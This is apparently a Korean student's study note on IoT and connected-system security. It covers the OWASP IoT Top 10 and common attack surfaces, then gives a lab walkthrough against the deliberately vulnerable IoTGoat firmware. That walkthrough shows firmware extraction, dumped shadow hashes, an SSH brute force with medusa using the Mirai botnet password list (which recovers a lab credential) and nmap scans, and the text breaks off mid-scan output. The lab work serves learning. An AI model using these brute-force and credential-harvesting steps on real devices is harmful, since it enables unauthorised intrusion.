<img width="1064" height="432" alt="Image" src="https://github.com/user-attachments/assets/5af15951-b555-4f12-9c2c-bb72ac381bea" />
<br>

# 🌙 Knights Frontier 공동 미션 (1)-1
- 모든 기수 BoB 프로젝트 주제 중 가장 관심있는 주제 3개 선택하고 지식 탐구 및 정리하기 
<br>

## Connected System 취약점 분석(7기)

<br>

### 탐구하려는 주제에 대한 간단한 소개
- '커넥티드 시스템(Connected System)'은 사물인터넷(IoT) 기술을 바탕으로 여러 기기, 시스템, 인프라 등이 서로 통신하며 정보를 주고받고 연동하는 것을 말한다.
- 주요 특징은 다음과 같다.
    - 개별 기기나 시스템이 서로 데이터를 주고받으면서 소통
    - 수집된 데이터를 분석하여 실행가능한 인사이트를 얻고, 이를 바탕으로 의사결정
    - 새로운 부가가치 창출 및 사회적 문제 해결에 기여
 
<br>

### 이 주제를 관심 있는 주제로 선정한 이유
- 자동차(커넥티드 카)나 IoT 기반기기 등 Connected System과 관련한 산업이 늘어나고 있다.
IoT 기기 시장에 대한 규모는 매년 증가하고 있으며, IoT 기기 생산과 사용량이 늘어남에 따라 이에 대한 보안 위협도 증가하고 있다.

- 최근 IoT 보안 솔루션과 관련하여 졸업 프로젝트를 진행하였는데, 보안 솔루션 개발을 하는 과정에서 IoT 보안에 대한 공부를 더 심도있게 하지 못한 부분이 아쉬웠다. 
BOB에서 진행한 프로젝트 중 이와 관련하여 좀 더 광범위하게 공부할 수 있는 주제가 해당 주제라고 생각했다.

- 평소 관심있는 분야이기에 졸업프로젝트에서는 개발에 초점을 뒀다면, 이번 미션을 통해서는 Connected System 과 관련한 취약점에 초점을 두고 공부하고, 기회가 된다면 실습도 진행하면서 IoT 보안과 관련한 좀 더 심도 깊은 이해를 할 수 있는 기회라고 생각했기 때문에 해당 주제를 선정하게 되었다.

<br>


### Connected System 취약점
- 아래 그림은 OWASP (Open Web Application Security Project) IoT (Internet of Things) Top 10 2018 목록으로 IoT 시스템에서 가장 흔하고 중요한 10가지 보안 위험을 보여준다. ([OWASP 사물 인터넷 | OWASP 재단](https://owasp.org/www-project-internet-of-things/?utm_source=chatgpt.com))

<br>
  
<p align="center"> <img width="700" height="990" alt="Image" src="https://github.com/user-attachments/assets/ef3de7de-6238-45ed-af73-bd2f8c4ff2f3" /></p>



<br>

- **Weak, Guessable, or Hardcoded Passwords (취약하거나 추측 가능한, 또는 하드코딩된 암호):** 쉽게 무차별 대입 공격에 노출되거나, 공개적으로 알려지거나, 변경할 수 없는 자격 증명(firmware 또는 클라이언트 소프트웨어의 백도어 포함) 사용.

- **Insecure Network Services (안전하지 않은 네트워크 서비스):** 장치 자체에서 실행되는 불필요하거나 안전하지 않은 네트워크 서비스(특히 인터넷에 노출된 경우)로 인해 정보의 기밀성, 무결성/인증 또는 가용성이 손상되거나 무단 원격 제어가 허용됨.

- **Insecure Ecosystem Interfaces (안전하지 않은 에코시스템 인터페이스):** 장치 외부의 웹, 백엔드 API, 클라우드 또는 모바일 인터페이스가 안전하지 않아 장치 또는 관련 구성 요소가 손상될 수 있음. 인증/인가 부족, 암호화 부족 또는 약함, 입력 및 출력 필터링 부족 등이 일반적인 문제.

- **Lack of Secure Update Mechanism (안전한 업데이트 메커니즘 부족):** 장치를 안전하게 업데이트할 수 있는 능력 부족. 펌웨어 유효성 검사 부족, 안전하지 않은 전송(암호화되지 않은 전송), 롤백 방지 메커니즘 부족, 보안 변경 사항에 대한 알림 부족 등이 포함됨.

- **Use of Insecure or Outdated Components (안전하지 않거나 오래된 구성 요소 사용):** 장치 손상을 허용할 수 있는 사용 중단되거나 안전하지 않은 소프트웨어 구성 요소/라이브러리 사용. 운영 체제 플랫폼의 안전하지 않은 사용자 정의, 손상된 공급망의 타사 소프트웨어 또는 하드웨어 구성 요소 사용 등이 포함됨.

- **Insufficient Privacy Protection (불충분한 개인 정보 보호):** 장치 또는 에코시스템에 저장된 사용자의 개인 정보가 안전하지 않게, 부적절하게, 또는 허가 없이 사용되는 경우.

- **Insecure Data Transfer and Storage (안전하지 않은 데이터 전송 및 저장):** 에코시스템 내 어디에서든 민감한 데이터에 대한 암호화 또는 접근 통제가 부족한 경우(저장 중, 전송 중, 처리 중 포함).

- **Lack of Device Management (장치 관리 부족):** 자산 관리, 업데이트 관리, 보안 폐기, 시스템 모니터링 및 대응 능력 등 운영 환경에 배포된 장치에 대한 보안 지원 부족.

- **Insecure Default Settings (안전하지 않은 기본 설정):** 장치 또는 시스템이 안전하지 않은 기본 설정으로 출고되거나, 운영자가 구성을 수정하여 시스템을 더 안전하게 만들 수 있는 능력이 부족한 경우.

- **Lack of Physical Hardening (물리적 강화 부족):** 잠재적 공격자가 장치에 대한 민감한 정보를 얻거나 로컬 제어를 할 수 있도록 허용하는 물리적 강화 조치 부족. 

<br>

### Connected System 종류 및 특징

1) 스마트홈 / 소비자 IoT

- 예: 스마트 스피커, IP 카메라, 스마트 플러그, 스마트 전구, 스마트 락 등
- 특징: 사용자 앱(모바일/웹) + 클라우드 + 로컬 디바이스(종종 Wi-Fi/BT)

2) 웨어러블 / 헬스케어 디바이스

- 예: 스마트워치, 혈당계, 원격의료 기기
- 특징: 민감한 개인의료데이터 + 블루투스/무선 통신 + 모바일 연동

3) 커넥티드 차량 / 자동차 (CAN, V2X)

- 예: 차량 내 네트워크(ECU), 텔레매틱스, OTA 업데이트, V2X 통신
- 특징: 실시간 제어, 여러 게이트웨이(쉴드/무선), 복합적 공격면(유선+무선+물리)

5) 스마트 빌딩 / 건물자동화(BAS/BMS)

- 예: HVAC, 엘리베이터 제어, 출입통제, 조명제어
- 특징: 여러 벤더·프로토콜(BACnet, KNX 등), 운영·관리 시스템 통합

6) 엣지 디바이스 / 게이트웨이

- 예: IIoT 게이트웨이, 스마트 라우터, 엣지 AI 장치
- 특징: 로컬 데이터 수집·전처리, 클라우드와 중계, 종종 리소스 제약

7) 카메라/영상 감시 시스템 (CCTV/NVR)

- 예: IP 카메라, NVR, VMS
- 특징: 스트리밍·저장·원격 접속 기능, 외부 노출 빈도 높음

8) 클라우드 백엔드 + API

- 예: 디바이스 관리 서버, 인증 서버, 데이터 저장소, 분석 플랫폼
- 특징: 연결된 시스템의 중심, 권한·API 설계가 보안의 핵심

9) 모바일 앱 / 데스크톱 클라이언트

- 예: 디바이스 제어 앱, 관리 콘솔
- 특징: 사용자와 디바이스 사이의 인터페이스, 로컬 데이터·인증 저장소 영향 큼

10) 스마트 그리드 / 에너지 시스템

- 예: 스마트 미터, 분산 에너지 자원(태양광 인버터)
- 특징: 규제 대상, 대규모 분산 인프라, 실시간 계측 데이터

<br>

### 흔히 발생하는 Connected System 주요 공격면 및 취약점

1) 스마트홈 / 소비자 IoT

- 주요 공격면: 무인증 로컬 API, 취약한 펌웨어 업데이트, 약한 인증, 암호화 미사용, UPnP/NAT 포워딩 등
- 취약점: 기본 비밀번호, 인증 우회, 펌웨어 무결성 미검증, 정보 노출

2) 웨어러블 / 헬스케어 디바이스

- 주요 공격면: 블루투스 페어링, 데이터 전송·저장, 앱-서버 인증, 물리적 접근
- 흔한 취약점: 암호화 누락, 데이터 무단 노출, 인증취약

3) 커넥티드 차량 / 자동차 (CAN, V2X)

- 주요 공격면: OBD-II, 블루투스, Wi-Fi, 모바일 앱, 백엔드 서버, OTA 서명 검증
- 흔한 취약점: 인증/암호화 누락, ECU 취약점, 불완전한 OTA 서명 검증

4) 스마트 빌딩 / 건물자동화(BAS/BMS)

- 주요 공격면: 프로토콜 취약, 인증·권한관리 미흡, 네트워크 분할 실패
- 흔한 취약점: 접근 제어 부재, 평문 통신, 기본 설정 방치

5) 엣지 디바이스 / 게이트웨이

- 주요 공격면: 로컬 API, 컨테이너/앱 취약점, 펌웨어·패키지 취약
- 흔한 취약점: 취약한 패키지/라이브러리, 권한 상승, 잘못된 인증

6) 카메라/영상 감시 시스템 (CCTV/NVR)

- 주요 공격면: RTSP/ONVIF 인증, 파일 저장 경로, 펌웨어 업데이트, 기본 계정
- 흔한 취약점: 인증 우회, 경로 탐색, 음성·영상 유출

7) 클라우드 백엔드 + API

- 주요 공격면: 인증·인가, API 취약점, 잘못된 CORS, 불충분한 로깅
- 흔한 취약점: 토큰 탈취, 권한 상승, 인젝션 취약점

8) 모바일 앱 / 데스크톱 클라이언트

- 주요 공격면: 인증 저장(키체인/Keystore 미이용), 인텐트/딥 링크 취약, 난독화 부재
- 흔한 취약점: 민감정보 하드코딩, 불충분한 인증, 취약한 SSL/TLS 설정

9) 스마트 그리드 / 에너지 시스템

- 주요 공격면: 무인증 원격 조작, 데이터 무결성 공격, 프로토콜 취약
- 흔한 취약점: 무인증 API, 펌웨어/업데이트 취약

<br>

### Connected System 취약점 실습하기 : [실습 참고자료](https://jookting.tistory.com/105)

<br>

실습을 진행하려는 과정에서 환경 구축이 잘 되지 않아서 일단 실습을 진행한 다른 블로그를 참고하여 간접적으로 실습내용에 대해 공부해보는 시간을 가졌다.         
IoT 취약점 실습용 환경인 IoTGoat를 사용해 펌웨어 분석 → 인증정보 획득 → 서비스 스캔 → 숨겨진 페이지 탐색 → 쉘 획득까지의 과정을 실습 위주

<br>

**<분석 단계 및 주요 발견>**

<br>

<img width="717" height="318" alt="Image" src="https://github.com/user-attachments/assets/3cbf89d2-ec20-4ed7-91f0-33498444587b" />

<br>
<br>

**펌웨어 내 하드코딩 되어있는 사용자 인증정보 획득하기**

- binwalk를 이용하여 IoTGoat 파일 시스템 추출

<br>

   
```
$ binwalk -eM IoTGoat-raspberry-pi2.img

Scan Time:     2021-01-14 00:54:42
Target File:   /home/kali/Desktop/IoTGoat-raspberry-pi2.img
MD5 Checksum:  9fb28986b3a610fe60f3927bc7dd643b
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
-------------------------------------------------------------------------------
4253711       0x40E80F        Copyright string: "copyright does *not* cover user programs that use kernel"
4253946       0x40E8FA        Copyright string: "copyrighted by the Free Software"
4254058       0x40E96A        Copyright string: "copyrighted by me and others who actually wrote it."
4254443       0x40EAEB        Copyright string: "Copyright (C) 1989, 1991 Free Software Foundation, Inc."
4256293       0x40F225        Copyright string: "copyright the software, and"
...
...
29360128      0x1C00000       Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3946402 bytes, 1333 inodes, blocksize: 262144 bytes, created: 2019-01-30 12:21:02

```

<br>

**생성된 폴더 내 Passwd 파일 확인하기**
<br>

- root와 iotgoatuser 의 로그인 쉘 /bin/ash 확인 가능

<br>
  
```
$ cat _IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/passwd*
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
iotgoatuser:x:1000:1000::/root:/bin/ash

```

<br>

**Shadow 파일 확인**
- 암호 알고리즘 ($1=md5)과 패스워드 확인

 

<br>

```
$ cat _IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/shadow*
root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
iotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::
root:$1$KzoHhzG9$wGyFXbWOcRChy3e.Ep2NY1:18080:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::

```
<br>

**bruteforce tool을 이용하여 패스워드 크랙**

- seclists 설치 (민감 정보 패턴, 퍼징 페이로드, 웹쉘 등을 제공함)

- 미라이 봇넷에서 사용한 패스워드 리스트를 이용

<br>


```
$ git clone https://github.com/danielmiessler/SecLists.git                                                                                                                                                                           1 ⨯
Cloning into 'SecLists'...
remote: Enumerating objects: 9535, done.
remote: Total 9535 (delta 0), reused 0 (delta 0), pack-reused 9535
Receiving objects: 100% (9535/9535), 779.68 MiB | 10.81 MiB/s, done.
Resolving deltas: 100% (4948/4948), done.
Updating files: 100% (5336/5336), done.

```

<br>

- 제공되는 mirai-botnet.txt 파일 내에 (사용자,패스워드) 쌍으로 저장되어 있으므로 패스워드만 남겨 파일을 재생성 함
  
<br>
<br>

```
$ ls
conficker.txt  mirai-botnet.txt

$ awk '{print $2}' mirai-botnet.txt > mirai-botnet_passwords.txt

```

<br>

- medusa를 이용하여 패스워드 크랙 시도

- 대상: 실행중인 IoTGoat-x86의 ip

<br>

```
$ medusa -u iotgoatuser -P mirai-botnet_passwords.txt -h 192.168.64.133 -M ssh               
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: xc3511 (1 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: vizxv (2 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: admin (3 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: admin (4 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 888888 (5 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: xmhdipc (6 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: default (7 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: jauntech (8 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 123456 (9 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 54321 (10 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: support (11 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: (none) (12 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: password (13 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: root (14 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 12345 (15 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: user (16 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: (none) (17 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: pass (18 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: admin1234 (19 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 1111 (20 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: smcadmin (21 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 1111 (22 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 666666 (23 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: password (24 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 1234 (25 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: klv123 (26 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: admin (27 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: service (28 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: supervisor (29 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: guest (30 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 12345 (31 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: password (32 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 1234 (33 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 666666 (34 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 888888 (35 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: ubnt (36 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: klv1234 (37 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: Zte521 (38 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: hi3518 (39 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: jvbzd (40 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: anko (41 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: zlxx. (42 of 60 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.64.133 (1 of 1, 0 complete) User: iotgoatuser (1 of 1, 0 complete) Password: 7ujMko0vizxv (43 of 60 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.64.133 User: iotgoatuser Password: 7ujMko0vizxv [SUCCESS]

```
<br>

- ssh 접속하여 획득한 패스워드로 로그인 (iotgoatuser/7ujMko0vizxv)

<br>

<img width="650" height="407" alt="Image" src="https://github.com/user-attachments/assets/acffa705-8fe4-424a-b728-b4d61b7308bc" />

<br>
<br>


**nmap 스캔을 통한 서비스 정보 획득**

<br>


-전체 포트 스캔하여 오픈된 서비스 확인

<br>

```
$ nmap -p- -sT 192.168.64.133 // -p-: 모든 포트 스캔, -sT: TCP Open Scan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 02:25 EST
Nmap scan report for 192.168.64.133
Host is up (0.00098s latency).
Not shown: 65390 closed ports, 138 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
443/tcp   open  https
5000/tcp  open  upnp
5515/tcp  open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2801.44 seconds

```

<br>

**upnp 서비스 버전 정보 스캔**
<br>

- MiniUPnP 2.1

<br>

```
$ nmap -p5000 -sV 192.168.64.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 00:57 EST
WARNING: Service 192.168.64.133:5000 had already soft-matched upnp, but now soft-matched rtsp; ignoring second value
WARNING: Service 192.168.64.133:5000 had already soft-matched upnp, but now soft-matched sip; ignoring second value
Nmap scan report for 192.168.64.133
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp    MiniUPnP 2.1 (UPnP 1.1)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.91%I=7%D=1/15%Time=60012ECE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,124,"\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/
SF:html\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Op
SF:enWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HE
SF:AD><TITLE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Impl
SF:emented</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20
SF:this\x20server\.</BODY></HTML>\r\n")%r(GetRequest,117,"HTTP/1\.0\x20404
SF:\x20Not\x20Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\
SF:r\nContent-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\
SF:x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found
SF:</TITLE></HEAD><BODY><H1>Not\x20Found</H1>The\x20requested\x20URL\x20wa
SF:s\x20not\x20found\x20on\x20this\x20server\.</BODY></HTML>\r\n")%r(RTSPR
SF:equest,12C,"RTSP/1\.0\x20501\x20Not\x20Implemented\r\nContent-Type:\x20
SF:text/html\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\
SF:x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTM
SF:L><HEAD><TITLE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x2
SF:0Implemented</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20b
SF:y\x20this\x20server\.</BODY></HTML>\r\n")%r(HTTPOptions,12C,"HTTP/1\.0\
SF:x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/html\r\nConnectio
SF:n:\x20close\r\nContent-Length:\x20149\r\nServer:\x20OpenWRT/18\.06\.2\x
SF:20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>501\x20
SF:Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Implemented</H1>The\x
SF:20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x20server\.<
SF:/BODY></HTML>\r\n")%r(FourOhFourRequest,117,"HTTP/1\.0\x20404\x20Not\x2
SF:0Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\r\nContent
SF:-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPn
SF:Pd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found</TITLE></
SF:HEAD><BODY><H1>Not\x20Found</H1>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20this\x20server\.</BODY></HTML>\r\n")%r(SIPOptions,12B,
SF:"SIP/2\.0\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/html\r\
SF:nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20OpenWRT/1
SF:8\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TIT
SF:LE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Implemented
SF:</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x2
SF:0server\.</BODY></HTML>\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```
<br>

**nmap에서 제공하는 broadcast-upnp-info 스크립트를 이용하여 세부정보 스캔하기**

- Webserver: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1

- 참고자료 : [참고 자료](nmap.org/nsedoc/scripts/broadcast-upnp-info.html)

<br>

```
$ nmap -sV --script=broadcast-upnp-info 192.168.64.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 01:02 EST
Pre-scan script results:
| broadcast-upnp-info: 
|   239.255.255.250
|       Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|       Location: http://192.168.64.133:5000/rootDesc.xml
|         Webserver: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|         Name: OpenWRT router
|         Manufacturer: OpenWRT
|         Model Descr: OpenWRT router
|         Model Name: OpenWRT router
|         Model Version: 1
|         Name: WANDevice
|         Manufacturer: MiniUPnP
|         Model Descr: WAN Device
|         Model Name: WAN Device
|         Model Version: 20190130
|         Name: WANConnectionDevice
|         Manufacturer: MiniUPnP
|         Model Descr: MiniUPnP daemon
|         Model Name: MiniUPnPd
|_        Model Version: 20190130
WARNING: Service 192.168.64.133:5000 had already soft-matched upnp, but now soft-matched rtsp; ignoring second value
WARNING: Service 192.168.64.133:5000 had already soft-matched upnp, but now soft-matched sip; ignoring second value
Nmap scan report for 192.168.64.133
Host is up (0.00042s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      Dropbear sshd (protocol 2.0)
53/tcp   open  domain   dnsmasq 2.73
80/tcp   open  http     LuCI Lua http config
443/tcp  open  ssl/http LuCI Lua http config
5000/tcp open  upnp     MiniUPnP 2.1 (UPnP 1.1)
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 134
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL was not found on this server.</BODY></HTML>
|   GenericLines: 
|     501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>
|   RTSPRequest: 
|     RTSP/1.0 501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>
|   SIPOptions: 
|     SIP/2.0 501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|_    <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.91%I=7%D=1/15%Time=60013014%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,124,"\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/
SF:html\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Op
SF:enWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HE
SF:AD><TITLE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Impl
SF:emented</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20
SF:this\x20server\.</BODY></HTML>\r\n")%r(GetRequest,117,"HTTP/1\.0\x20404
SF:\x20Not\x20Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\
SF:r\nContent-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\
